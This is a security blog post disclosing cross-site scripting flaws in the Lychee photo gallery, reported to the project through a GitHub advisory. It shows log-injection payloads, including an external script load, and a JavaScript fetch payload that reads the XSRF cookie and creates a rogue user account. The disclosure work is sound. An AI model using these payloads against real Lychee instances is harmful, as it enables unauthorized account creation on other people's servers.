
<!DOCTYPE html>

<html lang="en">
<head>
<meta charset="utf-8"/>
<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
<meta content="True" name="HandheldFriendly"/>
<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
<meta content="" name="robots"/>
<link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&amp;family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&amp;display=swap" rel="stylesheet"/>
<link href="../../theme/stylesheet/style.min.css" rel="stylesheet" type="text/css"/>
<link href="../../theme/stylesheet/dark-theme.min.css" id="dark-theme-style" media="(prefers-color-scheme: dark)" rel="stylesheet" type="text/css"/>
<link href="../../theme/pygments/monokai.min.css" id="pygments-dark-theme" media="(prefers-color-scheme: dark)" rel="stylesheet" type="text/css"/>
<link href="../../theme/pygments/sas.min.css" id="pygments-light-theme" media="(prefers-color-scheme: light), (prefers-color-scheme: no-preference)" rel="stylesheet" type="text/css"/>
<link href="../../theme/font-awesome/css/fontawesome.css" rel="stylesheet" type="text/css"/>
<link href="../../theme/font-awesome/css/brands.css" rel="stylesheet" type="text/css"/>
<link href="../../theme/font-awesome/css/solid.css" rel="stylesheet" type="text/css"/>
<link href="https://maggick.fr/feeds/all.atom.xml" rel="alternate" title="maggick's logs Atom" type="application/atom+xml"/>
<meta content="maggick" name="author"/>
<meta content="Lychee is a self-hosted photo-management and gallery. I am using the Lychee application for my personal usage (mostly sharing pictures with the family). The application has been greatly improved since the last update of my instance. I fired up a docker and start taking a look at the application for new features. It was not long before I found a few XSS, one of them could allow unauthenticated users to to gain logged access to the platform by creating a new account. I reported the issues to the project and we created a Github Security Advisory: https://github.com/LycheeOrg/Lychee-front/security/advisories/GHSA-cr79-38hg-27gv." name="description"/>
<meta content="security, CVE, XSS" name="keywords"/>
<meta content="maggick's logs" property="og:site_name">
<meta content="Cross-Site Scripting in Lychee" property="og:title"/>
<meta content="Lychee is a self-hosted photo-management and gallery. I am using the Lychee application for my personal usage (mostly sharing pictures with the family). The application has been greatly improved since the last update of my instance. I fired up a docker and start taking a look at the application for new features. It was not long before I found a few XSS, one of them could allow unauthenticated users to to gain logged access to the platform by creating a new account. I reported the issues to the project and we created a Github Security Advisory: https://github.com/LycheeOrg/Lychee-front/security/advisories/GHSA-cr79-38hg-27gv." property="og:description"/>
<meta content="en_US" property="og:locale"/>
<meta content="../../2022/10/cross-site-scripting-in-lychee.html" property="og:url"/>
<meta content="article" property="og:type"/>
<meta content="2022-10-22 14:25:00+02:00" property="article:published_time"/>
<meta content="" property="article:modified_time"/>
<meta content="../../author/maggick.html" property="article:author"/>
<meta content="security" property="article:section">
<meta content="security" property="article:tag"/>
<meta content="CVE" property="article:tag"/>
<meta content="XSS" property="article:tag"/>
<meta content="https://maggick.fr/media/image.png" property="og:image"/>
<title>maggick's logs – Cross-Site Scripting in Lychee</title>
</meta></meta></head>
<body>
<aside>
<div>
<a href="../../">
<img alt="maggick's logs" src="https://maggick.fr/media/image.png" title="maggick's logs"/>
</a>
<h1>
<a href="../../">maggick's logs</a>
</h1>
<p>Offensive security tales</p>
<nav>
<ul class="list">
<li>
<a href="../../pages/about.html" target="_self">
                About
              </a>
</li>
<li>
<a href="../../pages/links.html" target="_self">
                Links
              </a>
</li>
<li>
<a href="../../pages/notes.html" target="_self">
                Notes
              </a>
</li>
<li>
<a href="../../pages/tools.html" target="_self">
                Tools
              </a>
</li>
</ul>
</nav>
<ul class="social">
<li>
<a class="sc-github" href="https://github.com/maggick" target="_blank">
<i class="fa-brands fa-github"></i>
</a>
</li>
<li>
<a class="sc-twitter" href="https://twitter.com/maggick_fr" target="_blank">
<i class="fa-brands fa-twitter"></i>
</a>
</li>
<li>
<a class="sc-stack-overflow" href="http://stackoverflow.com/users/1827067/maggick" target="_blank">
<i class="fa-brands fa-stack-overflow"></i>
</a>
</li>
<li>
<a class="sc-rss" href="https://maggick.fr/feeds/all.atom.xml" target="_blank">
<i class="fa-solid fa-rss"></i>
</a>
</li>
</ul>
</div>
</aside>
<main>
<nav>
<a href="../../">Home</a>
<a href="/archives.html">Archives</a>
<a href="/categories.html">Categories</a>
<a href="/tags.html">Tags</a>
<a href="https://maggick.fr/feeds/all.atom.xml">Atom</a>
</nav>
<article class="single">
<header>
<h1 id="cross-site-scripting-in-lychee">Cross-Site Scripting in Lychee</h1>
<p>
      Posted on 22 Oct 2022 in <a href="../../category/security.html">security</a>

        • 3 min read
    </p>
</header>
<div>
<p><img alt="XSS in Lychee" class="align-left" src="/media/2022.10/xss_album_title_1.png" width="262"/></p>
<p><a href="https://lycheeorg.github.io/">Lychee</a> is a self-hosted photo-management and gallery.
I am using the <a href="https://lycheeorg.github.io/">Lychee</a> application for my personal usage (mostly
sharing pictures with the family).</p>
<p>The application has been greatly improved since the last update of my instance.
I fired up a <a href="https://hub.docker.com/r/lycheeorg/lychee">docker</a> and start taking a look at the
application for new features.
It was not long before I found a few XSS, one of them could allow unauthenticated users to to gain
logged access to the platform by creating a new account.</p>
<p>I reported the issues to the project and we created a
<a href="https://docs.github.com/en/code-security/repository-security-advisories/about-github-security-advisories-for-repositories">Github Security Advisory</a>:
<a href="https://github.com/LycheeOrg/Lychee-front/security/advisories/GHSA-cr79-38hg-27gv">https://github.com/LycheeOrg/Lychee-front/security/advisories/GHSA-cr79-38hg-27gv</a>.</p>
<p>The lychee application create an administrator account the first time the application is browsed.
This account is the only one with administrative privileges (account management, logs and
diagnostics) and is expected to have full access to the underlying server (shell access). In
addition, this account has access to all photos and albums
uploaded by the different users.</p>
<p>All this privileges made this account attractive for XSS payloads and attacks.
Note that the session cookie was <code>HttpOnly</code> and that the <code>XSRF</code> cookie was not, it will matter later
in the exploitation phase.</p>
<h1>Insertion points</h1>
<p>Only the admin can create a user account while there is a few authenticated insertions points
(photo and album title, username once the user changed it) they are not that interesting as the
admin probably trust the new users or even does not create user accounts.</p>
<p><img alt="xss in album title" src="/media/2022.10/xss_album_title_0.png"/>
<img alt="xss in album title" src="/media/2022.10/xss_album_title_1.png"/></p>
<p>I focused on unauthenticated insertion points.</p>
<h2>Logs logs logs</h2>
<p>The admin user has access to a "Show Logs" administrative function. I quickly noticed that
authentication attempts where displayed in the logs including the user controlled <code>user</code> parameter.</p>
<h2>Log injection - alert(1)</h2>
<p>It was relatively easy to try to login as the <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> user and trigger an alert
in the admin session (the screenshot below is when the user change its username but the result is the
same as we inject the logs).</p>
<p><img alt="unauthenticated xss in album title" src="/media/2022.10/xss_username_log.png"/></p>
<p>It is possible for an attacker to perform
<a href="https://owasp.org/www-community/attacks/Log_Injection">log injection</a> using this entry point.</p>
<h2>Beyond alert(1)</h2>
<p>I wanted to go beyond an alert pop-up, we want a user account. Using the username
<code>&lt;script src='172.0.0.1/a.js"/&gt;</code>, I was able to inject a longer JavaScript payload that would
request the API endpoint <code>User::create</code> passing in POST parameters its username, password and
privileges. I also retrieve the <code>X-XSRF-TOKEN</code> value from the cookie as it was not <code>HttpOnly</code> (I
recommended to the team to add this flag to the XSRF cookie but that
was not possible as they also needed to access it using JavaScript.)</p>
<div class="highlight"><pre><span></span><code><span class="nx">fetch</span><span class="p">(</span><span class="s1">'http://172.17.0.2:80/api/User::create'</span><span class="p">,{</span><span class="w"></span>
<span class="w">    </span><span class="c1">// create a POST request to be sent to the lychee instance located at `172.17.0.2`</span><span class="w"></span>
<span class="w">    </span><span class="nx">method</span><span class="o">:</span><span class="w"> </span><span class="s1">'POST'</span><span class="p">,</span><span class="w"></span>
<span class="w">    </span><span class="c1">// setup the headers</span><span class="w"></span>
<span class="w">    </span><span class="nx">headers</span><span class="o">:</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">        </span><span class="s1">'Content-Type'</span><span class="o">:</span><span class="w"> </span><span class="s1">'application/json'</span><span class="p">,</span><span class="w"></span>
<span class="w">        </span><span class="s1">'Accept'</span><span class="o">:</span><span class="w"> </span><span class="s1">'application/json, text/javascript, */*; q=0.01'</span><span class="p">,</span><span class="w"></span>
<span class="w">        </span><span class="c1">//the X-XSRF-TOKEN is retrieve from the cookie store as it is not `HttpOnly`</span><span class="w"></span>
<span class="w">        </span><span class="s1">'X-XSRF-TOKEN'</span><span class="o">:</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s1">'='</span><span class="p">)[</span><span class="mf">1</span><span class="p">].</span><span class="nx">split</span><span class="p">(</span><span class="s1">'%'</span><span class="p">)[</span><span class="mf">0</span><span class="p">],</span><span class="w"></span>
<span class="w">        </span><span class="s1">'X-Requested-With'</span><span class="o">:</span><span class="w"> </span><span class="s1">'XMLHttpRequest'</span><span class="p">,</span><span class="w"></span>
<span class="p">},</span><span class="w"></span>
<span class="w">    </span><span class="c1">// body of the request containing the payload to create a new user with upload privileges</span><span class="w"></span>
<span class="w">    </span><span class="nx">body</span><span class="o">:</span><span class="w"> </span><span class="s1">'{"username":"xss_1","password":"xss","may_upload":true,"is_locked":false}'</span><span class="w"></span>
<span class="p">})</span><span class="w"></span>
</code></pre></div>
<p>Once the new account was created I was able to browse the application as an authenticated user and
upload photos and images on the server.</p>
</div>
<div class="tag-cloud">
<p>
<a href="../../tag/security.html">security</a>
<a href="../../tag/cve.html">CVE</a>
<a href="../../tag/xss.html">XSS</a>
</p>
</div>
<div class="neighbors">
<a class="btn float-left" href="../../2022/08/htb-late.html" title="HTB: Late">
<i class="fa fa-angle-left"></i> Previous Post
    </a>
</div>
</article>
<footer>
<p>
  © 2022  - This work is licensed under a <a href="http://creativecommons.org/licenses/by/4.0/deed.en_US" rel="license" target="_blank">Creative Commons Attribution</a>
</p>
<p>
Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a href="http://bit.ly/flex-pelican" target="_blank">Flex</a> theme
  <span class="footer-separator">|</span>
  Switch to the <a href="javascript:void(0)" onclick="theme.switch(`dark`)">dark</a> | <a href="javascript:void(0)" onclick="theme.switch(`light`)">light</a> | <a href="javascript:void(0)" onclick="theme.switch(`browser`)">browser</a> theme
  <script data-default-theme="light" data-enable-auto-detect-theme="True" id="dark-theme-script" src="../../theme/dark-theme/dark-theme.min.js" type="text/javascript">
</script>
</p><p>
<a href="http://creativecommons.org/licenses/by/4.0/" rel="license" target="_blank">
<img alt="Creative Commons License" height="15" src="https://i.creativecommons.org/l/by/4.0/80x15.png" style="border-width:0" title="Creative Commons License" width="80">
</img></a>
</p></footer> </main>
<script type="application/ld+json">
{
  "@context" : "http://schema.org",
  "@type" : "Blog",
  "name": " maggick's logs ",
  "url" : "../..",
  "image": "https://maggick.fr/media/image.png",
  "description": ""
}
</script>
</body>
</html>